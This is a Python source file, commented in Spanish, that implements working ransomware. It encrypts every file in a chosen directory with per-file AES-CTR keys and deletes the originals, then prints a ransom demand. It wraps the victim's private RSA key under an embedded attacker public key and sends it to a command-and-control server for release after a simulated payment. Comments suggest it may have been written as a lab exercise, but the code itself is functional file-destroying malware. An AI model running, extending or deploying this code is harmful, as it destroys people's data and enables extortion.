#!/usr/bin/env python3
import os
import sys
import zipfile 
import socket
import argparse

#import utils
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

PUERTO_CC = 9999
TAM_SEGMENTO_RSA = 190
CHUNK_SIZE = 1024

LLAVE_PUBLICA_PERMANENTE = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3jWj/eKUyI0oTbzCupIH
KQMghcglcJPNQqwRsr9MPiw5vQsKdr3VdSb6rbuJznGF5EQB1xByJO12OA6fc81q
qMYrPEOy3SgFmcLnMRmJEebRGXicfoCltq8/aTiVya9W5JqKZI/vxMUpaxYbBtms
Xe6AbvmtCS9tXDCo2xFxu/3zHHPXWz8CL98xGhiA3tEY2U+GHxvv039KeYYV6+Jz
LGAz5wQcDg0ul2dNqvPHp+hDett15k93QGIDyoap0WIqwF0G4IEBVeqnToTeVauG
kSlUBafVuFcLMU5oP9icmf/qbsWqbWg/lp+SM+MJSvahm50JVcqHFbdGttB+MFDD
KQIDAQAB
-----END PUBLIC KEY-----"""

def _recibir_exacto(sock, n):
    datos = b''
    while len(datos) < n:
        chunk = sock.recv(n - len(datos))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        datos += chunk
    return datos

def enviar_bytes(sock, data: bytes):
    longitud = len(data).to_bytes(4, 'big')
    sock.sendall(longitud + data)

def recibir_bytes(sock) -> bytes:
    longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
    return _recibir_exacto(sock, longitud)



# ------------ FASE 2: GENERACIÓN DE LLAVES LOCALES ------------
def generar_privada():
    """
    Genera el par de llaves RSA únicas para la víctima.
    """
    return rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
    )

def generar_publica(privada):
    return privada.public_key()

def convertir_llave_privada_bytes(llave_privada):
    resultado = llave_privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    return resultado

def convertir_bytes_llave_privada(contenido_binario):
    resultado = serialization.load_pem_private_key(
        contenido_binario,
        backend=default_backend(),
        password=None)
    return resultado

def regresar_bytes(path_archivo): # CORRECCIÓN: Agregamos la función de agregar bytes 
    contenido = ''
    with open(path_archivo, 'rb') as archivo:
        contenido = archivo.read()
    return contenido


# ------------ CIFRADO DE LA LLAVE PRIVADA ------------
def segmentar_llave(llave_privada_local):
    """
    Divide los bytes de la llave privada local en bloques de 190 bytes. 
    """
    segmentos = [llave_privada_local[i:i + TAM_SEGMENTO_RSA]
                for i in range(0, len(llave_privada_local), TAM_SEGMENTO_RSA)]
    return segmentos

def cifrar_segmentos(segmentos_llave):
    """
    Cifra cada segmento de la llave_privada_local con RSA-OAEP usando la llave_publica_permanente.
    return: segmentos cifrados 
    """
    llave_publica_permanente = serialization.load_pem_public_key(
        LLAVE_PUBLICA_PERMANENTE,
        backend=default_backend()
    )
    segmentos_cifrados = []
    for pedazo in segmentos_llave:
        cifrado = llave_publica_permanente.encrypt(
            pedazo,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        segmentos_cifrados.append(cifrado)
    return segmentos_cifrados

def crear_paquete_llave(segmentos_cifrados, nombre_zip = "llave_local.zip"):
    """
    Toma la lista de segmentos cifrados con la llave_publica_permanente,
    los guarda temporalmente y los mete en un archivo .zip.
    """
    with zipfile.ZipFile(nombre_zip, 'w') as archivo_zip:
        for i, segmento in enumerate(segmentos_cifrados):
            nombre_segmento = f"seg{i}.bin"

            with open(nombre_segmento, 'wb') as f:
                f.write(segmento)

            archivo_zip.write(nombre_segmento)
            os.remove(nombre_segmento)
    print(f"Archivo: {nombre_zip} creado con éxito.")

def enviar_paquete_zip(sock, nombre_zip="llave_local.zip"):
    """
    Lee el archivo .zip y lo envía completo al servidor CC.
    """
    with open(nombre_zip, 'rb') as f:
        contenido_zip = f.read()
    enviar_bytes(sock, contenido_zip)
    print(f"Paquete {nombre_zip} enviado con éxito al servidor CC")



def cifrar_archivos(directorio, llave_publica_local):
    """
    Esta funcion cifra los archivos dentro de un directorio marcado usando AES-CTR
    se crea una llave AES y un IV por cada archivo dentro del directorio.
    Cifra cada archivo por via CTR usando la llave AES y el IV previamente creado.
    Se cifra la llave AES usando la llave publica local.
    El nuevo archivo cifrado se le agregaria el IV mas la llave cifrada al final.
    Se elimina el archivo original en texto plano.

    resultado: IV + LLAVE_AES_CIFRADA + TEXTO_CIFRADO
    """
    for nombre_archivo in os.listdir(directorio):
        ruta = os.path.join(directorio, nombre_archivo)
        if os.path.isfile(ruta):
            llave_aes = os.urandom(16) # Se genera una llave_aes para ese archivo
            iv = os.urandom(16) # Y también un IV

            llave_aes_cifrada = llave_publica_local.encrypt(
                llave_aes,
                padding.OAEP (
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                ))
            aesCipher = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend = default_backend())
            aesEncryptor = aesCipher.encryptor()

            ruta_salida = ruta + ".cifrado"
            
            with open(ruta, 'rb') as f, open(ruta_salida, 'wb') as s:
	            # Escribir en cabecera: IV + LLAVE AES CIFRADA
	            s.write(iv + llave_aes_cifrada)

	            while True:
	                chunk = f.read(CHUNK_SIZE)
	                if not chunk:
	                    break
	                s.write(aesEncryptor.update(chunk))
	            s.write(aesEncryptor.finalize())
            os.remove(ruta) # Emilinar ruta original 


def descifrar_archivos(directorio, llave_privada_local):
    """
    Esta funcion descifra los archivos dentro de un directorio marcado usando AES-CTR
    Obtiene el IV (16 bytes) y la llave_AES haciendo rebanadas (archivo+iv+llaveAEScifrada)
    Descifra la llave AES usando la llave privada local recibida del CC.
    Descifra cada archivo con CTR usando el IV y la llave AES previamente obtenido.

    returns: El nuevo archivo descifrado y en texto plano.
    """
    for nombre_archivo in os.listdir(directorio):
        if nombre_archivo.endswith(".cifrado"):# Sólo procesar los archivos con extensión .cifrado
            ruta_cifrada = os.path.join(directorio, nombre_archivo)
            ruta_original = ruta_cifrada.replace(".cifrado", "")

            with open(ruta_cifrada, 'rb') as f, open(ruta_original, 'wb') as s:
                iv = f.read(16)# Rebanado de cabecera, leer los primeros 16 bytes del IV
                llave_aes_cifrada = f.read(256) # Leer los siguiente 256 bytes para la llave AES cifrada
    
                llave_aes = llave_privada_local.decrypt(
                    llave_aes_cifrada,
                    padding.OAEP (
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None))

                aesCipher = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend = default_backend())
                aesDecryptor = aesCipher.decryptor()

                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    s.write(aesDecryptor.update(chunk))
                s.write(aesDecryptor.finalize())
            os.remove(ruta_cifrada)
            
    print(f"Recuperación completada en: {directorio}")
    

def ataque(directorio):
    """
    FASE: Infección y Cifrado
    1. Genera llaves RSA locales para la víctima (publica y privada)
    2. Protege la llave privada local mediante segmentación y cifrado RSA-OAEP
    3. Empaqueta los segmentos en un zip para enviarlos al Servidor CC
    4. Cifra los archivos de la victima con AES-CTR
    """
    print("======================== INICIANDO FASE DE ATAQUE ========================")
    
    privada_local = generar_privada()
    publica_local = generar_publica(privada_local)

    privada_pem = convertir_llave_privada_bytes(privada_local)

    segmentos_planos = segmentar_llave(privada_pem)
    segmentos_cifrados = cifrar_segmentos(segmentos_planos)

    crear_paquete_llave(segmentos_cifrados, "llave_local_protegida.zip")

    del privada_local
    del privada_pem

    print("[!] Llave privada local protegida y eliminada.\n")

    print(f"[!] Cifrando archivos en: {directorio} ...")
    cifrar_archivos(directorio, publica_local)

    print("\n")
    print("***Como castigo por tus pecados digitales, la undécima plaga ha caído sobre ti***")
    print("[!] TODOS TUS ARCHIVOS HAN SIDO CIFRADOS")
    print("[!] Para recuperarlos debes realizar el pago por rescate.") 
    print("\n\n\n")

def recuperacion(directorio, ip_servidor, puerto_servidor):
    """
    FASE: Recuperación y Simulación de Pago
    1. Confirma el pago con la víctima
    2. Envia el paquete .zip con los segmentos al Servidor CC
    3. Recibe la llave privada local ya descifrada por el atacante 
    4. Procede a descifrar los archivos del directorio
    """
    print("======================== INICIANDO FASE DE RECUPERACIÓN ========================")
    # Simulación de confirmación de pago
    confirmacion = input("Ingrese el código de liberación:")
    if confirmacion.lower() != "pagado": 
        print("[!] Pago no verificado. Saliendo...")
        return

    try:
        # Establecer conexión con el Servidor CC
        print(f"Conectando al Servidor CC en {ip_servidor}:{puerto_servidor}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_servidor, int(puerto_servidor)))

        # Enviar el paquete .zip con los segmentos cifrados
        nombre_zip = "llave_local_protegida.zip"
        if os.path.exists(nombre_zip):
            print(f"Enviando {nombre_zip} para su descifrado...")
            with open(nombre_zip, 'rb') as f:
                contenido_zip = f.read()
            enviar_bytes(sock, contenido_zip)
        else:
            print("[!] No se encontró el paquete de llaves. No se puede recuperar.")
            return

        print("[!] Esperando la llave de liberación desde el servidor...")
        llave_privada_pem = recibir_bytes(sock)
        sock.close()

        llave_privada_local = convertir_bytes_llave_privada(llave_privada_pem)
        print("[OK] Llave de liberación recibida y procesada con éxito")

        print(f"Restaurando archivos en: {directorio}...")
        descifrar_archivos(directorio, llave_privada_local)

        if os.path.exists(nombre_zip):
            os.remove(nombre_zip)
        print("\n\n\n")
        print("[OK] ¡TODOS TUS ARCHIVOS HAN SIDO RECUPERADOS!")
    except Exception as e:
        print(f"[!] Error durante la recuperación: {e}")

if __name__ == "__main__":
    """pasar argumentos
    1. directorio: directorio donde se realizara el ataque
    2. ip del servidor CC : ip a donde va a mandar los segmentos de la llave RSA (esta parte dime que opinas, si pasar la ip como variable o ponerla dentro del script)
    
    - modos de uso:
        1. --ataque -directorio (para cifrar los archivos) - Llama a la funcion de ataque
        2. --recuperacion -directorio (para descifrar los archivos) -ip (para enviar los segmentos de la llave RSA cifrada) -p puerto del servidor - llama a la funcion de recuperacion
    """
    parser = argparse.ArgumentParser()
    modo = parser.add_mutually_exclusive_group(required=True)

    modo.add_argument("--ataque", action="store_true")
    modo.add_argument("--recuperacion", action="store_true")

    parser.add_argument("-d", "--directorio", required=True)
    parser.add_argument("--ip")
    parser.add_argument("-p", "--puerto", type=int, default=5000)

    args = parser.parse_args()
    
    if args.ataque:
    	ataque(args.directorio)

    elif args.recuperacion:
        if not args.ip:
            print("Error. Debes especificar la ip")
            sys.exit(1)
        recuperacion(args.directorio, args.ip, args.puerto)
